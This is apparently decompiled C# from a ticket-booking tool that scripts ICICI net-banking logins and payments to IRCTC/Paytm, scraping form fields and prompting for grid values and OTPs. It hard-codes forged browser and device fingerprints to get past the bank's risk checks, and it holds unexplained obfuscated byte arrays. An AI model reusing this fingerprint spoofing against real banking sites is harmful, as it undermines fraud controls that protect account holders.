                                    length = string_97.IndexOf("<", startIndex) - startIndex;
                                    string_91 = string_97.Substring(startIndex, length).Trim();
                                }
                                if (string.IsNullOrEmpty(string_91))
                                {
                                    string_91 = "Failed while Processing into ICICI";
                                }
                                clsMain.Lock("Third Hit Failed, Not valid HTML err = " + string_91);
                                return false;
                            }
                            text4 = "TranRequestManagerFG.GRID_CARD_AUTH_VALUE_1__=&TranRequestManagerFG.GRID_CARD_AUTH_VALUE_2__=&TranRequestManagerFG.GRID_CARD_AUTH_VALUE_3__=&Action.SUBMIT_TRANSACTION=Submit&FG_BUTTONS__=SUBMIT_TRANSACTION%2CBACK_CONTINUE%2CSEL_USER_LOOKUP&FORMSGROUP_ID__=TranRequestManagerFG&isIrctcPmt=false&isWalletPayee=false&TranRequestManagerFG.REPORTTITLE=InitiateSingleEntryPaymentConfirmation&counterPartyNickName=IRCTC+Ltd%28PAYTM+MOBILE+SOLUTION%29&amountSendToCxps=" + text6 + "&counterPartyTpe=M&freqTyp=O&bankId=ICI&cxpsUserId=" + text15 + "&corpId=" + text15 + "&usertype=1&RECEIVED_RESPONSE=&deviceDNA=%7B%22VERSION%22%3A%221.0%22%2C%22MFP%22%3A%7B%22System%22%3A%7B%22Platform%22%3A%22Win32%22%2C%22Language%22%3A%22en-US%22%2C%22Timezone%22%3A-330%2C%22Fonts%22%3A%22%22%7D%2C%22Screen%22%3A%7B%22FullHeight%22%3A768%2C%22AvlHeight%22%3A728%2C%22FullWidth%22%3A1366%2C%22AvlWidth%22%3A1366%2C%22BufferDepth%22%3A%22%22%2C%22ColorDepth%22%3A24%2C%22PixelDepth%22%3A24%2C%22DeviceXDPI%22%3A%22%22%2C%22DeviceYDPI%22%3A%22%22%2C%22FontSmoothing%22%3A%22%22%2C%22UpdateInterval%22%3A%22%22%7D%2C%22Browser%22%3A%7B%22UserAgent%22%3A%22Mozilla%2F5.0+%28Windows+NT+6.3%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F65.0.3325.181+Safari%2F537.36%22%2C%22Vendor%22%3A%22Google+Inc.%22%2C%22VendorSubID%22%3A%22%22%2C%22BuildID%22%3A%22%22%2C%22CookieEnabled%22%3Atrue%7D%2C%22Camera%22%3A%22%22%2C%22Microphone%22%3A%22%22%7D%2C%22MAC%22%3A%22%22%2C%22ExternalIP%22%3A%22192.168.116.30%22%2C%22InternalIP%22%3A%22%22%2C%22MESC%22%3A%22mi%3D2%3Bcd%3D200%3Bid%3D50%3Bmesc%3D475119%3Bldi%3D207%3Bmesc%3D792130%3Bldi%3D213%22%2C%22DESC%22%3A%22%22%7D&executionTime=1234&desc=&mesc=mi%3D2%3Bcd%3D200%3Bid%3D50%3Bmesc%3D475119%3Bldi%3D207%3Bmesc%3D792130%3Bldi%3D213&dnaError=&mescIterationCount=2&isDNADone=true&arcotFlashCookie=&DEVICE_ID=&DEVICE_TYPE=DEVICEID.HTTP&MACHINE_FINGER_PRINT=%7B%22VERSION%22%3A%221.0%22%2C%22MFP%22%3A%7B%22System%22%3A%7B%22Platform%22%3A%22Win32%22%2C%22Language%22%3A%22en-US%22%2C%22Timezone%22%3A-330%2C%22Fonts%22%3A%22%22%7D%2C%22Screen%22%3A%7B%22FullHeight%22%3A768%2C%22AvlHeight%22%3A728%2C%22FullWidth%22%3A1366%2C%22AvlWidth%22%3A1366%2C%22BufferDepth%22%3A%22%22%2C%22ColorDepth%22%3A24%2C%22PixelDepth%22%3A24%2C%22DeviceXDPI%22%3A%22%22%2C%22DeviceYDPI%22%3A%22%22%2C%22FontSmoothing%22%3A%22%22%2C%22UpdateInterval%22%3A%22%22%7D%2C%22Browser%22%3A%7B%22UserAgent%22%3A%22Mozilla%2F5.0+%28Windows+NT+6.3%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F65.0.3325.181+Safari%2F537.36%22%2C%22Vendor%22%3A%22Google+Inc.%22%2C%22VendorSubID%22%3A%22%22%2C%22BuildID%22%3A%22%22%2C%22CookieEnabled%22%3Atrue%7D%2C%22Camera%22%3A%22%22%2C%22Microphone%22%3A%22%22%7D%2C%22MAC%22%3A%22%22%2C%22ExternalIP%22%3A%22192.168.116.30%22%2C%22InternalIP%22%3A%22%22%2C%22MESC%22%3A%22mi%3D2%3Bcd%3D200%3Bid%3D50%3Bmesc%3D475119%3Bldi%3D207%3Bmesc%3D792130%3Bldi%3D213%22%2C%22DESC%22%3A%22%22%7D&FieldDropdown=Value&MFPrint=%7B%22VERSION%22%3A%221.0%22%2C%22MFP%22%3A%7B%22System%22%3A%7B%22Platform%22%3A%22Win32%22%2C%22Language%22%3A%22en-US%22%2C%22Timezone%22%3A-330%2C%22Fonts%22%3A%22%22%7D%2C%22Screen%22%3A%7B%22FullHeight%22%3A768%2C%22AvlHeight%22%3A728%2C%22FullWidth%22%3A1366%2C%22AvlWidth%22%3A1366%2C%22BufferDepth%22%3A%22%22%2C%22ColorDepth%22%3A24%2C%22PixelDepth%22%3A24%2C%22DeviceXDPI%22%3A%22%22%2C%22DeviceYDPI%22%3A%22%22%2C%22FontSmoothing%22%3A%22%22%2C%22UpdateInterval%22%3A%22%22%7D%2C%22Browser%22%3A%7B%22UserAgent%22%3A%22Mozilla%2F5.0+%28Windows+NT+6.3%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F65.0.3325.181+Safari%2F537.36%22%2C%22Vendor%22%3A%22Google+Inc.%22%2C%22VendorSubID%22%3A%22%22%2C%22BuildID%22%3A%22%22%2C%22CookieEnabled%22%3Atrue%7D%2C%22Camera%22%3A%22%22%2C%22Microphone%22%3A%22%22%7D%2C%22MAC%22%3A%22%22%2C%22ExternalIP%22%3A%22192.168.116.30%22%2C%22InternalIP%22%3A%22%22%2C%22MESC%22%3A%22mi%3D2%3Bcd%3D200%3Bid%3D50%3Bmesc%3D475119%3Bldi%3D207%3Bmesc%3D792130%3Bldi%3D213%22%2C%22DESC%22%3A%22%22%7D&xyz=&ABC=ABC&JS_ENABLED_FLAG=Y&CHECKBOX_NAMES__=&Requestid=2&TranRequestManagerFG.__COLLAPSIBLE_IDS__=";
                            while (true)
                            {
                                if (string_97.IndexOf("Please enter the following digits of your Debit Grid") > 0)
                                {
                                    string text19 = array3[5];
                                    string text20 = string_97.Substring(string_97.IndexOf("Please enter the following digits of your Debit Grid"));
                                    int num3 = 1;
                                    do
                                    {
                                        string text21 = text20.Substring(text20.IndexOf("gridauth_input_cell_style") + 27);
                                        text21 = text21.Substring(0, text21.IndexOf("</td>"));
                                        string string_98 = "";
                                        text20 = text20.Substring(text20.IndexOf("gridauth_input_cell_style") + 27);
                                        if (string.IsNullOrEmpty(text19))
                                        {
                                            string_98 = Interaction.InputBox("Enter Debit Card Grid Value For Following Digit: " + text21);
                                        }
                                        else
                                        {
                                            string[] array5 = Strings.Split(text19, "&&");
                                            for (int k = 0; k < array5.Length; k++)
                                            {
                                                string[] array6 = Strings.Split(array5[k], "=");
                                                if (text21.Contains(array6[0]))
                                                {
                                                    string_98 = array6[1];
                                                }
                                            }
                                        }
                                        text4 = clsPostData.SetPost(text4, "TranRequestManagerFG.GRID_CARD_AUTH_VALUE_" + num3 + "__", string_98);
                                        num3++;
                                    }
                                    while (num3 != 4 && text20.IndexOf("gridauth_input_cell_style") > 0);
                                }
                                while (true)
                                {
                                    if (string_97.Contains("TranRequestManagerFG.ONE_TIME_PASSWORD__"))
                                    {
                                        string text22 = Interaction.InputBox("Please Re-Register for I-Safe, Enter new OTP Received on Mobile.", "ICICI Bank Mobile OTP.", "", clsMain.control_0.PointToScreen(clsMain.rectangle_0.Location).X, clsMain.control_0.PointToScreen(clsMain.rectangle_0.Location).Y).Trim();
                                        if (text22.Length >= 5)
                                        {
                                            string_94 = text22;
                                        }
                                        text4 = clsPostData.SetPost(text4, "TranRequestManagerFG.ONE_TIME_PASSWORD__", string_94);
                                    }
                                    startIndex = string_97.IndexOf("name=\"TranRequestManagerFG") + 10;
                                    startIndex = string_97.IndexOf("=\"", startIndex) + 2;
                                    length = string_97.IndexOf("\"", startIndex) - startIndex;
                                    text7 = string_97.Substring(startIndex, length);
                                    startIndex = string_97.IndexOf("counterPartyNickName", startIndex);
                                    startIndex = string_97.IndexOf("lue=\"", startIndex) + 5;
                                    length = string_97.IndexOf("\"", startIndex) - startIndex;
                                    string_97.Substring(startIndex, length).Trim();
                                    startIndex = string_97.IndexOf("amountSendToCxps", startIndex);
                                    startIndex = string_97.IndexOf("lue=\"", startIndex) + 5;
                                    length = string_97.IndexOf("\"", startIndex) - startIndex;
                                    string_97.Substring(startIndex, length).Trim();
                                    startIndex = string_97.IndexOf("counterPartyTpe", startIndex);
                                    startIndex = string_97.IndexOf("lue=\"", startIndex) + 5;
                                    length = string_97.IndexOf("\"", startIndex) - startIndex;
                                    string text23 = string_97.Substring(startIndex, length).Trim();
                                    startIndex = string_97.IndexOf("freqTyp", startIndex);
                                    startIndex = string_97.IndexOf("lue=\"", startIndex) + 5;
                                    length = string_97.IndexOf("\"", startIndex) - startIndex;
                                    string text24 = string_97.Substring(startIndex, length).Trim();
                                    startIndex = string_97.IndexOf("Requestid", startIndex);
                                    startIndex = string_97.IndexOf("lue=\"", startIndex) + 5;
                                    length = string_97.IndexOf("\"", startIndex) - startIndex;
                                    text18 = string_97.Substring(startIndex, length).Trim();
                                    text4 = text4 + "&Action.SUBMIT_TRANSACTION=Submit&FG_BUTTONS__=SUBMIT_TRANSACTION%2cBACK_CONTINUE%2cSEL_USER_LOOKUP&FORMSGROUP_ID__=TranRequestManagerFG&isIrctcPmt=false&isWalletPayee=false&TranRequestManagerFG.REPORTTITLE=InitiateSingleEntryPaymentConfirmation&counterPartyNickName=IRCTC+Ltd%28PAYTM+MOBILE+SOLUTION%29&amountSendToCxps=" + text6 + "&counterPartyTpe=" + text23 + "&freqTyp=" + text24 + "&bankId=ICI&cxpsUserId=" + text15 + "&corpId=" + text16 + "&usertype=" + text17 + "&RECEIVED_RESPONSE=&JS_ENABLED_FLAG=N&CHECKBOX_NAMES__=&Requestid=" + text18 + "&TranRequestManagerFG.__COLLAPSIBLE_IDS__=&__JS_ENCRYPT_KEY__=10001%2c882f01917b854d8314dbd6ea2cdae899a60edee39050a4e89fbaf151925918920ad15a3d8e23cf2f057d6aeb3887da04f841fb35b4f254b6801611d0746360bafbc2e70a6c6c974825e55cf0aefea430c487d1c550a193f8e88b9d0952ac3a96780c7a8b5dc685efa520c69e07f60dea017731f9cbd19cc95ba7e8fa167a2d3f%2c131&deviceDNA=&executionTime=0&desc=&mesc=mi%3D2%3Bcd%3D200%3Bid%3D50&dnaError=&mescIterationCount=0&isDNADone=false&arcotFlashCookie=&Action.SUBMIT_TRANSACTION=Submit";
                                    string_95 = text5 + text7;
                                    clsMain.Lock("Fourth Hit Inp = " + text4);
                                    if (updateTStatus_1 != null)
                                    {
                                        updateTStatus_1.BeginInvoke(1, "Init. ICICI_NB(4/4)", tCntrlName_, null, null);
                                    }
                                    if (_Request(string_95, text4, string_92, webProxy_3, ref cookieContainer_, true, true, num, num, ref string_97, ref string_96, ref webException_0))
                                    {
                                        clsMain.Lock("Fourth Hit output = " + string_97);
                                        if (string_97.Contains("Your Merchant Reference Number is"))
                                        {
                                            break;
                                        }
                                        string_91 = "";
                                        if (string_97.Contains(">Input i-safe OTP is Invalid<") || string_97.Contains("OTP is Invalid<"))
                                        {
                                            if (num2 <= 1)
                                            {
                                                goto IL_11a9;
                                            }
                                            string_91 = "I-Safe OTP is Invalid";
                                            string prompt = "Input i-safe OTP is Invalid, Please enter new OTP.";
                                            string title = "ICICI Bank i-Safe Andriod APP.";
                                            string defaultResponse = "";
                                            int x = clsMain.control_0.PointToScreen(clsMain.rectangle_0.Location).X;
                                            string text25 = Interaction.InputBox(prompt, title, defaultResponse, x, clsMain.control_0.PointToScreen(clsMain.rectangle_0.Location).Y).Trim();
                                            if (text25.Length >= 5)
                                            {
                                                string_94 = text25;
                                                continue;
                                            }
                                        }
                                        if (string_97.Contains("errormsg"))
                                        {
                                            startIndex = string_97.IndexOf("errormsg");
                                            startIndex = string_97.IndexOf(">", startIndex) + 1;
                                            length = string_97.IndexOf("<", startIndex) - startIndex;
                                            string_96 = string_97.Substring(startIndex, length).Trim();
                                        }
                                        if (string.IsNullOrEmpty(string_91))
                                        {
                                            string_91 = "Failed while Processing into ICICI, Ticket Not Booked";
                                        }
                                        clsMain.Lock("Fourth Hit Failed, Not valid HTML err = " + string_91);
                                        return false;
                                    }
                                    clsMain.Lock("Fourth Hit Failed. err = " + string_96);
                                    string_91 = "Failed while making Payment at ICICI NB. Ticket Not Booked";
                                    return false;
                                }
                                break;
                            IL_11a9:
                                clsMain.Lock("invalid isafe, rehitting");
                                num2++;
                            }
                        }
                        startIndex = string_97.IndexOf("name=\"TranRequestManagerFG.RETURN_URL") + 10;
                        startIndex = string_97.IndexOf("lue=\"", startIndex) + 5;
                        length = string_97.IndexOf("\"", startIndex) - startIndex;
                        text7 = string_97.Substring(startIndex, length).Trim();
                        string_90 = HttpUtility.HtmlDecode(text7);
                        string_91 = string_95;
                        return true;
                    }
                }
                catch (Exception ex)
                {
                    clsMain.method_74("ProcessICICINetBanking", ex.Message);
                    result = false;
                }
                return result;
            }
            byte[] array7 = new byte[217];
            array7[128] = 0;
            array7[129] = 199;
            array7[133] = 9;
            string text26 = "Æ\u009aj\u0082\u007fÍ;>";
            for (int l = 0; l < text26.Length; l++)
            {
                array7[l + 137] = (byte)text26[l];
            }
            array7[100] = 86;
            array7[131] = 11;
            array7[94] = byte.MaxValue;
            array7[146] = 20;
            array7[103] = 252;
            array7[101] = 50;
            string text27 = "Some thing went wrong with ICICI Payment";
            array7[148] = 212;
            string_91 = text27;
            array7[108] = 71;
            array7[130] = 76;
            array7[93] = 120;
            array7[135] = 183;
            array7[145] = 251;
            string text28 = "Þ×3Üìù\u0085";
            for (int m = 0; m < text28.Length; m++)
            {
                array7[m + 150] = (byte)text28[m];
            }
            array7[158] = 25;
            array7[159] = 81;
            array7[105] = 236;
            array7[132] = 176;
            array7[147] = 153;
            array7[102] = 248;
            array7[97] = 220;
            array7[98] = 68;
            string string_99 = "Html doesn't contains icicibank, returning.";
            array7[134] = 132;
            array7[149] = 239;
            array7[157] = 52;
            clsMain.Lock(string_99);
            array7[106] = 193;
            string text29 = "ª\u007fMòn£Ì\u00a0\a£\u0099ÍD2ýø \0";
            for (int n = 0; n < text29.Length; n++)
            {
                array7[n + 109] = (byte)text29[n];
            }
            array7[136] = 110;
            array7[160] = 137;
            array7[96] = 113;
            array7[99] = 10;
            array7[104] = 140;
            array7[107] = 221;
            array7[127] = 0;
            array7[95] = 94;
            Class27.byte_3 = array7;
            return false;
        }

        private bool method_ICICI(string string_86, string string_88, string string_89, ref string string_90, ref string string_91, UpdateTStatus updateTStatus_2)
        {
           string string_94 = "";
            bool result = false;
            string_90 = "";
            string_91 = "";
            int num = 90000;
            clsMain.Lock("Enter ProcessICICINetBanking.");
            if (string_86.Contains("icicibank"))
            {
                string_90 = "";
                string string_92 = class3_0.string_70;
                byte[] array = new byte[357];
                
                string[] array2 = new string[1];
                array[97] = 220;
                array2[0] = "||";
                string[] separator = array2;
                array[98] = 68;
                string[] array3 = string_88.Split(separator, StringSplitOptions.None);
                
                string string_93 = array3[0].Trim();
                string text3 = array3[1];
                //string string_94 = array3[2];
                string string_95 = "";
                string text4;
                if (bool_13)
                {
                    bool_13 = false;
                    string[] array4 = string_86.Split(new string[1] { "|" }, StringSplitOptions.None);
                    text4 = array4[0];
                    string_95 = array4[1];
                }
                else
                {
                    text4 = class3_0.Method_SerialInp(string_86, ref string_95, false);
                }
                CookieContainer cookieContainer_ = null;
                string text5 = "https://shopping.icicibank.com/corp/";
                string string_96 = "";
                string string_97 = "";
                array[96] = 113;
                new object();
                int num2 = 0;
                try
                {
                    
                    Class27.byte_3 = array;
                    clsMain.Lock("First Hit : Inp = " + text4);
                    if (updateTStatus_1 != null)
                    {
                        updateTStatus_1.BeginInvoke(1, "Init. ICICI_NB(1/3)", tCntrlName_, null, null);
                    }
                    if (!_Request(string_95, text4, string_92, webProxy_3, ref cookieContainer_, true, true, num, num, ref string_97, ref string_96, ref webException_0))
                    {
                        string_91 = "ICICI Bank is not working.";
                        return false;
                    }
                    if (!string.IsNullOrEmpty(string_97.Trim()) && string_97.Contains("User ID"))
                    {
                        string text6 = "";
                        int startIndex = string_97.IndexOf("name=\"AuthenticationFG") + 10;
                        startIndex = string_97.IndexOf("=\"", startIndex) + 2;
                        int length = string_97.IndexOf("\"", startIndex) - startIndex;
                        string text7 = string_97.Substring(startIndex, length);
                        string text8 = class3_0.Method_SerialInp(string_97, ref string_95, true);
                        text8 = text8.Replace("buffer=&buffer=&alp_=&pp_=&pp_=&pp_caps=CAPS&pp_caps=CAPS&pp_erase=BACKSPACE&pp_clear=CLEAR&done=OK&RadioFlag=1&RadioFlag=2&RadioFlag=3", "").Replace("&Action.FORGOT_PWD=Go", "").Replace("&Action.VALIDATE_MOBILE_LOGIN=", "");
                        text8 = "RadioFlag=1&" + text8;
                        text8 += "&deviceDNA=%7B%22VERSION%22%3A%221.0%22%2C%22MFP%22%3A%7B%22System%22%3A%7B%22Platform%22%3A%22Win32%22%2C%22Language%22%3A%22en-US%22%2C%22Timezone%22%3A-330%2C%22Fonts%22%3A%221fa81f7f4c5685f36dbde63c4386a6bf%22%7D%2C%22Screen%22%3A%7B%22FullHeight%22%3A768%2C%22AvlHeight%22%3A728%2C%22FullWidth%22%3A1366%2C%22AvlWidth%22%3A1366%2C%22BufferDepth%22%3A%22%22%2C%22ColorDepth%22%3A24%2C%22PixelDepth%22%3A24%2C%22DeviceXDPI%22%3A%22%22%2C%22DeviceYDPI%22%3A%22%22%2C%22FontSmoothing%22%3A%22%22%2C%22UpdateInterval%22%3A%22%22%7D%2C%22Browser%22%3A%7B%22UserAgent%22%3A%22Mozilla%2F5.0+%28Windows+NT+6.1%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F47.0.2526.106+Safari%2F537.36%22%2C%22Vendor%22%3A%22Google+Inc.%22%2C%22VendorSubID%22%3A%22%22%2C%22BuildID%22%3A%22%22%2C%22CookieEnabled%22%3Atrue%7D%2C%22Camera%22%3A%22%22%2C%22Microphone%22%3A%22+%2C+%2C+%22%7D%2C%22MAC%22%3A%22%22%2C%22ExternalIP%22%3A%22116.202.249.241%22%2C%22InternalIP%22%3A%22%22%2C%22MESC%22%3A%22mi%3D2%3Bcd%3D200%3Bid%3D50%3Bmesc%3D434828%3Bldi%3D204%3Bmesc%3D504593%3Bldi%3D509%22%2C%22DESC%22%3A%22%22%7D&executionTime=819&desc=&mesc=mi%3D2%3Bcd%3D200%3Bid%3D50%3Bmesc%3D434828%3Bldi%3D204%3Bmesc%3D504593%3Bldi%3D509&dnaError=&mescIterationCount=2&isDNADone=true&arcotFlashCookie=undefined&DEVICE_ID=undefined&DEVICE_TYPE=DEVICEID.FLASH&MACHINE_FINGER_PRINT=%7B%22VERSION%22%3A%221.0%22%2C%22MFP%22%3A%7B%22System%22%3A%7B%22Platform%22%3A%22Win32%22%2C%22Language%22%3A%22en-US%22%2C%22Timezone%22%3A-330%2C%22Fonts%22%3A%221fa81f7f4c5685f36dbde63c4386a6bf%22%7D%2C%22Screen%22%3A%7B%22FullHeight%22%3A768%2C%22AvlHeight%22%3A728%2C%22FullWidth%22%3A1366%2C%22AvlWidth%22%3A1366%2C%22BufferDepth%22%3A%22%22%2C%22ColorDepth%22%3A24%2C%22PixelDepth%22%3A24%2C%22DeviceXDPI%22%3A%22%22%2C%22DeviceYDPI%22%3A%22%22%2C%22FontSmoothing%22%3A%22%22%2C%22UpdateInterval%22%3A%22%22%7D%2C%22Browser%22%3A%7B%22UserAgent%22%3A%22Mozilla%2F5.0+%28Windows+NT+6.1%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F47.0.2526.106+Safari%2F537.36%22%2C%22Vendor%22%3A%22Google+Inc.%22%2C%22VendorSubID%22%3A%22%22%2C%22BuildID%22%3A%22%22%2C%22CookieEnabled%22%3Atrue%7D%2C%22Camera%22%3A%22%22%2C%22Microphone%22%3A%22+%2C+%2C+%22%7D%2C%22MAC%22%3A%22%22%2C%22ExternalIP%22%3A%22116.202.249.241%22%2C%22InternalIP%22%3A%22%22%2C%22MESC%22%3A%22mi%3D2%3Bcd%3D200%3Bid%3D50%3Bmesc%3D434828%3Bldi%3D204%3Bmesc%3D504593%3Bldi%3D509%22%2C%22DESC%22%3A%22%22%7D&Action.VALIDATE_CREDENTIALS=+";
                        text8 = clsPostData.SetPost(text8, "AuthenticationFG.USER_PRINCIPAL", string_93);
                        text8 = clsPostData.SetPost(text8, "JS_ENABLED_FLAG", "Y");
                        string text9 = text8.Substring(text8.IndexOf("KEY__") + 6);
                        text9 = HttpUtility.UrlDecode(text9.Substring(0, text9.IndexOf("&")));
                        string text10 = "";
                        string text11 = "ICICI1";
                        updateTStatus_2?.Invoke(1004, text11 + "||" + text3 + "||" + text9, "");
                        if (clsMain.dictionary_5.ContainsKey(text11))
                        {
                            object obj = new object();
                            object obj2 = obj;
                            lock (obj2)
                            {
                                text10 = clsMain.dictionary_5[text11];
                                method_61("Encrypted Data, out = " + text10);
                                clsMain.dictionary_5.Remove(text11);
                            }
                        }
                        text8 = clsPostData.SetPost(text8, "AuthenticationFG.ACCESS_CODE", text10);
                        text8 = clsPostData.SetPost(text8, "AuthenticationFG.UBA_PASSWORD", "");
                        string text12 = "";
                        Thread.Sleep(200);
                        string text13 = "ICICI2";
                        updateTStatus_2?.Invoke(1004, text13 + "||dummy3||" + text9, "");
                        if (clsMain.dictionary_5.ContainsKey(text13))
                        {
                            object obj3 = new object();
                            object obj4 = obj3;
                            lock (obj4)
                            {
                                text12 = clsMain.dictionary_5[text13];
                                method_61("Encrypted Data, out = " + text12);
                                clsMain.dictionary_5.Remove(text13);
                            }
                        }
                        text8 = clsPostData.SetPost(text8, "dummy1", text12);
                        text4 = text8;
                        string_95 = text5 + text7;
                        string_92 = string_95;
                        string_95 = text5 + text7;
                        clsMain.Lock("Second Hit : Inp = " + text4);
                        if (updateTStatus_1 != null)
                        {
                            updateTStatus_1.BeginInvoke(1, "Init. ICICI_NB(2/3)", tCntrlName_, null, null);
                        }
                        if (!_Request(string_95, text4, string_92, webProxy_3, ref cookieContainer_, true, true, num, num, ref string_97, ref string_96, ref webException_0))
                        {
                            clsMain.Lock("Second Hit Failed. err = " + string_96);
                            string_91 = "Failed while making Payment. Payment Not Done";
                            return false;
                        }
                        string_92 = string_95;
                        clsMain.Lock("Second Hit Output = " + string_97);
                        if (!string_97.Contains("Make a Payment"))
                        {
                            if (string_97.Contains("errormsg"))
                            {
                                startIndex = string_97.IndexOf("errormsg");
                                startIndex = string_97.IndexOf(">", startIndex) + 1;
                                length = string_97.IndexOf("<", startIndex) - startIndex;
                                string_91 = string_97.Substring(startIndex, length).Trim();
                            }
                            if (string_97.Contains("Password is case-sensitive"))
                            {
                                string_91 = "Invalid ICICI UserID or Password";
                            }
                            else if (string.IsNullOrEmpty(string_91))
                            {
                                string_91 = "Failed while Login into ICICI";
                            }
                            clsMain.Lock("Second Hit, Not valid HTML err = " + string_91);
                            return false;
                        }
                        startIndex = string_97.IndexOf("name=\"TranRequestManagerFG") + 10;
                        startIndex = string_97.IndexOf("=\"", startIndex) + 2;
                        length = string_97.IndexOf("\"", startIndex) - startIndex;
                        text7 = string_97.Substring(startIndex, length);
                        startIndex = string_97.IndexOf("TranRequestManagerFG.INITOR_ACCOUNT");
                        startIndex = string_97.IndexOf("lue=\"", startIndex) + 5;
                        length = string_97.IndexOf("\"", startIndex) - startIndex;
                        string text14 = string_97.Substring(startIndex, length).Trim();
                        startIndex = string_97.IndexOf("name=\"Transaction") + 10;
                        startIndex = string_97.IndexOf("lue=\"", startIndex) + 5;
                        length = string_97.IndexOf("\"", startIndex) - startIndex;
                        string_97.Substring(startIndex, length).Trim();
                        startIndex = string_97.IndexOf("cxpsUserId", startIndex);
                        startIndex = string_97.IndexOf("lue=\"", startIndex) + 5;
                        length = string_97.IndexOf("\"", startIndex) - startIndex;
                        string text15 = string_97.Substring(startIndex, length).Trim();
                        startIndex = string_97.IndexOf("corpId", startIndex);
                        startIndex = string_97.IndexOf("lue=\"", startIndex) + 5;
                        length = string_97.IndexOf("\"", startIndex) - startIndex;
                        string text16 = string_97.Substring(startIndex, length).Trim();
                        startIndex = string_97.IndexOf("usertype", startIndex);
                        startIndex = string_97.IndexOf("lue=\"", startIndex) + 5;
                        length = string_97.IndexOf("\"", startIndex) - startIndex;
                        string text17 = string_97.Substring(startIndex, length).Trim();
                        startIndex = string_97.IndexOf("Requestid", startIndex);
                        startIndex = string_97.IndexOf("lue=\"", startIndex) + 5;
                        length = string_97.IndexOf("\"", startIndex) - startIndex;
                        string text18 = string_97.Substring(startIndex, length).Trim();
                        text4 = "TranRequestManagerFG.INITOR_ACCOUNT=" + text14 + "&TranRequestManagerFG.DESTINATION_TYPE=M&TranRequestManagerFG.DESTINATION_NICK_NAME_M=IRCTC+Ltd%28PAYTM+MOBILE+SOLUTION%29&TranRequestManagerFG.ENT_REMARKS=&Action.CONTINUE_TRANSACTION=PAY&FG_BUTTONS__=ADDNL_INFO%2CADD_ENTRY%2CSAVE_TRANSACTION%2CCONTINUE_TRANSACTION%2CFREQ_TYPE_GO%2CVIEW_OWN_ACNT_DET%2CLOOK_UP%2CADD_COUNTER_PARTY%2CCHECK_COUNTER_RATE%2CBACK_TO_ACTION%2CBACK_FOR_CP&TranRequestManagerFG.SINGLE_FREQ_TYPE=O&TranRequestManagerFG.SINGLE_NWK_TYP=WIB&TranRequestManagerFG.SINGLE_TRAN_PURPOSE=ITX&TranRequestManagerFG.VAL_IND=N&TranRequestManagerFG.END_DATE_UPDATE=-1&TranRequestManagerFG.TERMS_AND_COND_FLAG=Y&Transaction=SHP&FORMSGROUP_ID__=TranRequestManagerFG&TranRequestManagerFG.REPORTTITLE=InitiateSimplePaymentShoppingMall&counterPartyNickName=&amountSendToCxps=&counterPartyTpe=&freqTyp=O&bankId=ICI&cxpsUserId=" + text15 + "&corpId=" + text15 + "&usertype=1&RECEIVED_RESPONSE=&FieldDropdown=&MFPrint=&xyz=&ABC=ABC&JS_ENABLED_FLAG=N&CHECKBOX_NAMES__=&Requestid=1&TranRequestManagerFG.__COLLAPSIBLE_IDS__=%7C";
                        text4 = "TranRequestManagerFG.INITOR_ACCOUNT=" + text14 + "&TranRequestManagerFG.DESTINATION_TYPE=M&TranRequestManagerFG.DESTINATION_NICK_NAME_M=IRCTC+Ltd%28PAYTM+MOBILE+SOLUTION%29&TranRequestManagerFG.ENT_REMARKS=&Action.SUBMIT_TRANSACTION=PAY&FG_BUTTONS__=SUBMIT_TRANSACTION%2CBACK_CONTINUE%2CSEL_USER_LOOKUP&TranRequestManagerFG.SINGLE_FREQ_TYPE=O&TranRequestManagerFG.SINGLE_NWK_TYP=WIB&TranRequestManagerFG.SINGLE_TRAN_PURPOSE=ITX&TranRequestManagerFG.VAL_IND=N&TranRequestManagerFG.END_DATE_UPDATE=-1&TranRequestManagerFG.TERMS_AND_COND_FLAG=Y&Transaction=SHP&FORMSGROUP_ID__=TranRequestManagerFG&TranRequestManagerFG.REPORTTITLE=InitiateSimplePaymentShoppingMall&counterPartyNickName=One97+Communication+ltd%28PAYTM+MOBILE+SOLUTION%29&amountSendToCxps=&counterPartyTpe=&freqTyp=O&bankId=ICI&cxpsUserId=" + text15 + "&corpId=" + text15 + "&usertype=1&RECEIVED_RESPONSE=&FieldDropdown=&MFPrint=&xyz=&ABC=ABC&JS_ENABLED_FLAG=N&CHECKBOX_NAMES__=&Requestid=1&TranRequestManagerFG.__COLLAPSIBLE_IDS__=%7C";
                        string_95 = text5 + text7;
                        //clsMain.Lock("Third Hit Inp = " + text4);
                        //if (updateTStatus_1 != null)
                        //{
                        //    updateTStatus_1.BeginInvoke(1, "Init. ICICI_NB(3/4)", tCntrlName_, null, null);
                        //}
                        //if (!_Request(string_95, text4, string_92, webProxy_3, ref cookieContainer_, true, true, num, num, ref string_97, ref string_96, ref webException_0))
                        //{
                        //    clsMain.Lock("Third Hit Failed. err = " + string_96);
                        //    string_91 = "Failed while making Payment. Payment Not Done";
                        //    return false;
                        //}
                        string_92 = string_95;
                        clsMain.Lock("Third Hit Output = " + string_97);
                        if (!string_97.Contains("Your Merchant Reference Number is"))
                        {
                            if (!string_97.Contains("Authorization"))
                            {
                                string_91 = "";
                                if (string_97.Contains("errormsg"))
                                {
                                    startIndex = string_97.IndexOf("errormsg");
                                    startIndex = string_97.IndexOf(">", startIndex) + 1;
                                    length = string_97.IndexOf("<", startIndex) - startIndex;
                                    string_91 = string_97.Substring(startIndex, length).Trim();
                                }
                                if (string.IsNullOrEmpty(string_91))
                                {
                                    string_91 = "Failed while Processing into ICICI";
                                }
                                clsMain.Lock("Third Hit Failed, Not valid HTML err = " + string_91);
                                return false;
                            }
